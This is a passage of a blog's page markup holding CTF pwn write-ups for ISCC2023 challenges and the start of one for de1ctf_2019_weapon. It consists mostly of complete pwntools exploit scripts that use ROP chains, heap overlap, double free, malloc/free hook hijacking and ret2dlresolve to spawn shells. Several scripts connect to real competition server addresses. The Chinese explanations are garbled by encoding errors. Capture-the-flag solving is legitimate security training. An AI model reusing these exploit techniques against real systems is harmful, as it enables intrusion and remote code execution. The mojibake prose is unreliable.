libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

pop_rdi_ret=0x4008c3

io.recvuntil(b&amp;quot;tip: &amp;quot;)
libc_base=int(io.recv(14),16)-0x3c48e0
print(&amp;quot;libc_base:  &amp;quot;+hex(libc_base))

# gdb.attach(io)
# pause()

sys_addr=libc_base+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=libc_base+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.recvuntil(b&amp;quot;username:\n&amp;quot;)
payload=cyclic(0x1c)+p32(0x15CC15CC)
io.send(payload)

io.recvuntil(b&amp;quot;password:\n&amp;quot;)
payload=cyclic(0x28)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008be : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008c0 : pop r14 ; pop r15 ; ret
# 0x00000000004008c2 : pop r15 ; ret
# 0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008bf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400680 : pop rbp ; ret
# 0x00000000004008c3 : pop rdi ; ret
# 0x00000000004008c1 : pop rsi ; pop r15 ; ret
# 0x00000000004008bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400599 : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-13usage_of_pen&#34;&gt;attachment-13ï¼š(usage_of_pen)&lt;/h4&gt;
&lt;p&gt;è¢«è¿™é“é¢˜å‰é¢çš„æ¯”è¾ƒå‡½æ•°æ¶å¿ƒé“äº†ï¼Œå¾—ä¸Šç½‘æŸ¥ä¹¦æ³•çŸ¥è¯†æ‹¼æ‹¼éŸ³ç„¶åç”¨0è¡¥é½&lt;br&gt;
å‰©ä¸‹çš„å°±æ˜¯ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./usage_of_pen&amp;quot;)
io=remote(&amp;quot;59.110.164.72&amp;quot;,10002)
elf=ELF(&amp;quot;./usage_of_pen&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)


leave_ret=0x400942
pop_rdi=0x400c53
func_addr=0x400b0f
read_t1=0x40092B
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;!\n&amp;quot;)
# payload=b&amp;quot;dunbi000&amp;quot;
# payload=payload.ljust(40,b&amp;quot;+&amp;quot;)
# payload+=b&amp;quot;nvfeng00&amp;quot;
# payload=payload.ljust(72,b&amp;quot;+&amp;quot;)
payload=b&amp;quot;dunbi000cuobi000yufeng00dunfeng0cunfeng0nvfeng00yuefeng0anfeng00jiebi000&amp;quot;
io.send(payload)

io.recvuntil(b&amp;quot;space\n&amp;quot;)
payload=cyclic(0x28)+p64(func_addr)
io.send(payload)

payload=cyclic(0x28)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(func_addr)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

payload=cyclic(0x28)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400942 : leave ; ret
# 0x0000000000400c4c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c4e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c50 : pop r14 ; pop r15 ; ret
# 0x0000000000400c52 : pop r15 ; ret
# 0x0000000000400c4b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c4f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400800 : pop rbp ; ret
# 0x0000000000400c53 : pop rdi ; ret
# 0x0000000000400c51 : pop rsi ; pop r15 ; ret
# 0x0000000000400c4d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006c1 : ret
# 0x0000000000400a16 : ret 0x1474
# 0x00000000004009b2 : ret 0x8b48

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-14-your_character&#34;&gt;attachment-14: (your_character)&lt;/h4&gt;
&lt;p&gt;editæœ‰off by oneæ‰“å †å—é‡å ï¼Œæ§åˆ¶å †å—æœ€åæ‰“one_gadget&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./your_character&amp;quot;)
elf=ELF(&amp;quot;./your_character&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

# io.recvuntil(b&amp;quot;Your choice :&amp;quot;)
# io.sendline(b&amp;quot;2&amp;quot;)
# io.sendlineafter(b&amp;quot;character: \n&amp;quot;,b&amp;quot;a&amp;quot;)
io.recvuntil(b&amp;quot;Your choice :&amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)

def add(n,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Damage of skill : &amp;quot;,str(n))
    io.sendafter(b&amp;quot;introduction of skill:&amp;quot;,cc)
    
def extend(i,n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(i))
    io.sendlineafter(b&amp;quot;Damage of skill : &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendafter(b&amp;quot;introduction of skill : &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))

gdb.attach(io)
pause()

add(0x80,b&amp;quot;aaa&amp;quot;) #0
add(0x18,b&amp;quot;bbb&amp;quot;) #1
add(0x18,b&amp;quot;ccc&amp;quot;) #2
add(0x18,b&amp;quot;ddd&amp;quot;) #3

edit(1,b&amp;quot;a&amp;quot;*0x18+p64(0x61))
delete(2)

add(0x50,b&amp;quot;www&amp;quot;) #2
edit(2,b&amp;quot;A&amp;quot;*0x8)
show(2)

io.recvuntil(b&amp;quot;A&amp;quot;*0x8)
leak_addr=u64(io.recvline()[:-1].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


delete(0)

heap_addr=leak_addr-0xf0
edit(2,p64(0)*3+p64(0x21)+p64(0)+p64(heap_addr))
show(2)

libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x58-0x3C4B20
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=libc_addr+one_gadget[0]

edit(2,b&#39;A&#39;*0xf0+p64(heap_addr+0x10))  


io.interactive()


# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-32double&#34;&gt;attachment-32ï¼š(double)&lt;/h4&gt;
&lt;p&gt;aba double freeæ§åˆ¶å †å—åˆ°æŒ‡å®šä½ç½®ç„¶åæ§åˆ¶æŒ‡å®šä½ç½®æ•°æ®&lt;br&gt;
æœ¬é¢˜æ³¨æ„å¸ƒæ ˆç»†èŠ‚&lt;br&gt;
&lt;s&gt;f12æ˜¯ä¸ªå¥½ä¹ æƒ¯ï¼Œæœ€å¼€å§‹æ²¡æ‰¾åˆ°/bin/shå­—ä¸²&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10021)
# io=process(&amp;quot;./attachment-32&amp;quot;)
elf=ELF(&amp;quot;./attachment-32&amp;quot;)

shell=0x4008f7
pop_rdi_ret=0x400cb3

def add(n,s):
    io.recv()
    io.sendline(b&amp;quot;1&amp;quot;)
    io.recv()
    io.sendline(str(n))
    io.recv()
    io.sendline(str(s))
    
def edit(n,s):
    io.recv()
    io.sendline(b&amp;quot;4&amp;quot;)
    io.recv()
    io.sendline(str(n))
    io.recv()
    io.sendline(s)  
    
def delete(n):
    io.recv()
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recv()
    io.sendline(str(n))
    
def ex():
    io.recv()
    io.sendline(b&amp;quot;5&amp;quot;)
    
add(0,0x68)
add(1,0x68)
add(2,0x10)
delete(1)
delete(0)
delete(1)

add(3,0x68)
edit(3,p64(0x6021d8))

# gdb.attach(io)
# pause()   

add(4,0x68)
add(5,0x68)
add(6,0x68)
edit(6,p64(0x15CC15CC)+p64(0x400cd8)+p64(0)*6+p64(0xCC51CC51)) #/bin/sh
ex()


io.recvuntil(b&amp;quot;reward: &amp;quot;)
leak_addr=int(io.recv(14),16)
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
leak_addr=leak_addr+0xf0
low=(leak_addr)&amp;amp;0xff-0x8
print(&amp;quot;low: &amp;quot;+hex(low))
high=(leak_addr&amp;amp;0xffff)&amp;gt;&amp;gt;8
print(&amp;quot;high: &amp;quot;+hex(high))


payload=cyclic(0x20)+p8(low)+p8(high)
payload=payload.ljust(0xf0,b&amp;quot;a&amp;quot;)+p64(0x6021f8)+p64(0x4008f7) #system
io.recvuntil(b&amp;quot;say:\n&amp;quot;)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400cac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400cae : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400cb0 : pop r14 ; pop r15 ; ret
# 0x0000000000400cb2 : pop r15 ; ret
# 0x0000000000400cab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400caf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004007f0 : pop rbp ; ret
# 0x0000000000400cb3 : pop rdi ; ret
# 0x0000000000400cb1 : pop rsi ; pop r15 ; ret
# 0x0000000000400cad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006b1 : ret
# 0x0000000000400c40 : ret 0xfffc

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-36chef&#34;&gt;attachment-36ï¼š(chef)&lt;/h4&gt;
&lt;p&gt;editå­˜åœ¨æº¢å‡ºå†™ï¼Œå¯ä»¥off by oneæ„é€ å †å—é‡å &lt;br&gt;
ç„¶åå°±æ˜¯ç®€å•çš„åŠ«æŒ&lt;code&gt;__malloc_hook&lt;/code&gt;æ‰“one_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;, 10031)
# io=process(&amp;quot;./chef&amp;quot;)
elf=ELF(&amp;quot;./chef&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def menu():
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    
def show():
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;1&amp;quot;)
    
def add(n,cc):
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;price of food:&amp;quot;,str(n))
    io.sendafter(b&amp;quot;name of food:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index of food:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;price of food :&amp;quot;,str(s))
    io.sendafter(b&amp;quot;name of food:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index of food:&amp;quot;,str(n))
    
menu()

# gdb.attach(io)
# pause()    

add(0x18,b&amp;quot;aaa&amp;quot;) #0
add(0x40,b&amp;quot;bbb&amp;quot;) #1
add(0x30,b&amp;quot;ccc&amp;quot;) #2
add(0x10,b&amp;quot;eee&amp;quot;) #3

show()
edit(0,0x19,p64(0)*3+p64(0x91))
delete(1)
add(0x40,b&amp;quot;b&amp;quot;*7)
show()

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=leak_addr+one_gadget[1]

add(0x60,b&amp;quot;qqq&amp;quot;) #4
add(0x60,b&amp;quot;www&amp;quot;) #5
add(0x60,b&amp;quot;eee&amp;quot;) #6

delete(4)

payload=cyclic(0x10)+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
edit(3,len(payload),payload)
add(0x60,p64(shell))
add(0x60,cyclic(0x13)+p64(shell))

delete(5)

io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;price of food:&amp;quot;,b&amp;quot;96&amp;quot;)
# io.sendlineafter(b&amp;quot;name of food:&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()
    

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-37-trapped&#34;&gt;attachment-37: (Trapped)&lt;/h4&gt;
&lt;p&gt;å¼€å¯æ²™ç›’ç¦ç”¨&lt;code&gt;execve()&lt;/code&gt;ï¼Œéœ€è¦æ„é€ orw ropé“¾&lt;br&gt;
åŒæ—¶ä¹Ÿå¼€å¯canaryä¿æŠ¤ï¼Œå¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²&lt;br&gt;
æ³¨æ„é¢å¤–æ„é€ readåœ¨bssæ®µè¯»å…¥&lt;code&gt;&#39;/flag&#39;&lt;/code&gt;å­—ä¸²ç»™orwåšå‚æ•°ç”¨&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#å‚»é€¼æœ¬åœ°å¼€è°ƒè¯•è¾“å…¥å¿…å‡ºé”…
from pwn import*
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./Trapped&amp;quot;)
io=remote(&amp;quot;59.110.164.72&amp;quot;, 10066)
elf=ELF(&amp;quot;./Trapped&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

pop_rdi_ret=0x400a23
pop_rsi_r15=0x400a21

io.recvuntil(b&amp;quot;larger box\n&amp;quot;)
payload=b&amp;quot;aaaa%9$p&amp;quot;
io.send(payload)
io.recvuntil(b&amp;quot;aaaa&amp;quot;)
canary=int(io.recv(18),16)
print(&amp;quot;canary:  &amp;quot;+hex(canary))

io.recvuntil(b&amp;quot;larger box\n&amp;quot;)
payload=b&amp;quot;99&amp;quot;
io.send(payload)
io.recvuntil(b&amp;quot;about\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x400777)
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

pop_rdx_ret=0x01b92+leak_addr
pop_rsi_ret=0x202f8+leak_addr
pop3_ret=0x400a1e
bss_addr=0x601100
bss_len=0x1000
para=0x7
open_addr=libc.sym[b&amp;quot;open&amp;quot;]+leak_addr
write_addr=libc.sym[b&amp;quot;write&amp;quot;]+leak_addr
read_addr=libc.sym[b&amp;quot;read&amp;quot;]+leak_addr
mprotect=libc.sym[b&amp;quot;mprotect&amp;quot;]+leak_addr

# gdb.attach(io)
# pause()


io.recvuntil(b&amp;quot;about\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss_addr)+p64(elf.sym[b&amp;quot;read&amp;quot;])+p64(0x400777)
io.send(payload)
payload=b&amp;quot;/flag&amp;quot;
# payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)
io.send(payload)


io.recvuntil(b&amp;quot;about\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)
#o
payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)
#r
payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss_addr+0x160)+p64(pop_rdx_ret)+p64(0x50)+p64(read_addr)
#w
payload+=p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(bss_addr+0x160)+p64(pop_rdx_ret)+p64(0x50)+p64(write_addr)
io.send(payload)
io.recv()


io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400a1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a1e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a20 : pop r14 ; pop r15 ; ret
# 0x0000000000400a22 : pop r15 ; ret
# 0x0000000000400a1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a1f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006f8 : pop rbp ; ret
# 0x0000000000400a23 : pop rdi ; ret
# 0x0000000000400a21 : pop rsi ; pop r15 ; ret
# 0x0000000000400a1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040060e : ret
# 0x0000000000400682 : ret 0x2009
# 0x0000000000400960 : ret 0x2be
# 0x000000000040062b : jmp 0x400610
# 0x0000000000400775 : jmp 0x400700
# 0x00000000004008f5 : jmp 0x4008f8
# 0x000000000040099d : jmp 0x4009ad
# 0x0000000000400c0b : jmp qword ptr [rbp]
# 0x00000000004008a9 : jmp qword ptr [rsi - 0x39]
# 0x00000000004006f1 : jmp rax

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-38å¿˜äº†å«å•¥äº†dlresolveçš„é¢˜&#34;&gt;attachment-38ï¼š(å¿˜äº†å«å•¥äº†ï¼Œdlresolveçš„é¢˜)&lt;/h4&gt;
&lt;p&gt;å¯ä»¥ç”¨pwntoolsçš„è‡ªåŠ¨åŒ–å·¥å…·æ‰“é€š&lt;br&gt;
&lt;s&gt;ä½©æœæ‰‹åŠ¨æ„é€ çš„orz&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;, 10067)
# io=process(&amp;quot;./attachment-38&amp;quot;)
context.binary=elf=ELF(&amp;quot;./attachment-38&amp;quot;)
rop=ROP(&amp;quot;./attachment-38&amp;quot;)

bss_addr=0x804A01C
leave_ret=0x8048378
pop_ebp_ret=0x80484ab
pop3_ret=0x80484a9

dlresolve=Ret2dlresolvePayload(elf, symbol=&#39;system&#39;, args=[&#39;/bin/sh\x00&#39;])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)


# gdb.attach(io)
# pause()


log.info(rop.dump())
payload=flat({76:rop.chain(),256:dlresolve.payload})
io.send(payload)

# read_plt=elf.plt[b&amp;quot;read&amp;quot;]

# payload=cyclic(0x48)+p32(bss_addr)+p32(read_plt)+p32(pop3_ret)+p32(0)+p32(bss_addr)+p32(0x100)


io.interactive()

# Gadgets information
# ============================================================
# 0x08048378 : leave ; ret
# 0x080484ab : pop ebp ; ret
# 0x080484a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x080482c9 : pop ebx ; ret
# 0x080484aa : pop edi ; pop ebp ; ret
# 0x080484a9 : pop esi ; pop edi ; pop ebp ; ret
# 0x080482b2 : ret
# 0x0804838e : ret 0xeac1
# 0x08048568 : ret 0xfffe

# Unique gadgets found: 9
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-39sims&#34;&gt;attachment-39ï¼š(SIMS)&lt;/h4&gt;
&lt;p&gt;UAFçš„tcachebin attackï¼ŒåŠ«æŒ&lt;code&gt;__free_hook&lt;/code&gt;æ‰“one_gadget&lt;br&gt;
&lt;s&gt;æœ€åå¤šæ¬¡editæ˜¯æˆ‘æ‰¾ä¸åˆ°chunkä¸‹æ ‡äº†ï¼Œå­©å­ä¸æ‡‚æ‘ç€ç©çš„&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10085)
# io=process(&amp;quot;./SIMS&amp;quot;)
elf=ELF(&amp;quot;./SIMS&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;./libc-2.27.so&amp;quot;)

io.recvuntil(b&amp;quot;password:\n&amp;quot;)
rd=cs.rand()
print(&amp;quot;rd:  &amp;quot;+str(rd))
# for i in range(1,36569646000):
#     if rd^i==0x15cc15cc:
#         ps=i
#         break
#     else:
#         continue
ps=2118602923
print(&amp;quot;ans:  &amp;quot;+hex(ps^rd))
io.sendline(str(ps))

def add(n):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Stu:\n&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:\n&amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content of Stu:\n&amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:\n&amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(0x90)
    edit(i,b&amp;quot;/bin/sh&amp;quot;)
    
add(0x90) #8
edit(8,&amp;quot;/bin/sh&amp;quot;)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
shell=leak_addr+one_gadget[1]

# for i in range(0,6):
#     add(0x90)

edit(6,p64(free_hook))
add(0x90) #9  
add(0x90) #10
edit(0,p64(sys_addr)) 
edit(1,p64(sys_addr)) 
edit(2,p64(sys_addr)) 
edit(3,p64(sys_addr)) 
edit(4,p64(sys_addr)) 
edit(5,p64(sys_addr)) 
edit(6,p64(sys_addr)) 
edit(7,p64(sys_addr)) 
# edit(8,p64(sys_addr)) 
# add(0x90) #9
# add(0x90) #10
# add(0x90) #11
delete(8)

io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">ISCC2023 PWNéƒ¨åˆ†wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/dxpXmj6SV/"" data-c="
          &lt;p&gt;64ä½edit after freeï¼Œæ— showå‡½æ•°ï¼Œæ— æ³•æ­£å¸¸dumpå‡ºlibcåŸºå€&lt;br&gt;
åˆä¸€é“æ‰“&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;æ³„éœ²libcåŸºå€çš„é¢˜ç›®ï¼Œä¸è¿‡éš¾ç‚¹åœ¨äºfake_chunkçš„æ„é€ &lt;br&gt;
edité™åˆ¶äº†ä¿®æ”¹çš„é•¿åº¦ï¼Œåªæœ‰æ„é€ fake_chunkæ¥è¾¾åˆ°æº¢å‡ºå†™çš„ç›®çš„&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# gdb.attach(io)
# pause()

def shh():
    io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29563)
    # io=process(&amp;quot;./de1ctf_2019_weapon&amp;quot;)
    elf=ELF(&amp;quot;./de1ctf_2019_weapon&amp;quot;)
    libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)

    one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

    def add(s,n,cc):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendlineafter(b&amp;quot;weapon: &amp;quot;,str(s))
        io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
        io.sendafter(b&amp;quot;name:\n&amp;quot;,cc)
        
    def delete(n):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)
        io.sendlineafter(b&amp;quot;idx :&amp;quot;,str(n))
        
    def edit(n,cc):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;3&amp;quot;)
        io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))
        io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)
    add(0x60,0,b&amp;quot;aaa&amp;quot;)
    add(0x60,1,b&amp;quot;bbb&amp;quot;)
